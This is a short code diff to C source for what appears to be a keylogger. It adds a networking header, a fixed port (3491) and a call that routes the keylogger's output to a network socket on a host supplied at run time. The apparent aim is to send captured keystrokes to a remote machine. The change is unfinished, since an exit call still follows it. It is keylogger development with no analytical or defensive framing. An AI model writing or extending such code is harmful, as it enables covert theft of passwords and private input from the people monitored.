@@ -5,6 +5,9 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include "keylogger.h"
+#include "networking.h"
+
+#define PORT "3491"
 
 void print_usage_and_quit(char *application_name);
 
@@ -41,7 +44,7 @@ int main(int argc, char *argv[]){
         }
     }
     else if(network){
-        // TODO: Remove exit
+        writeout = get_socket_file_descriptor(option_input, PORT);
         exit(1);
     }
 
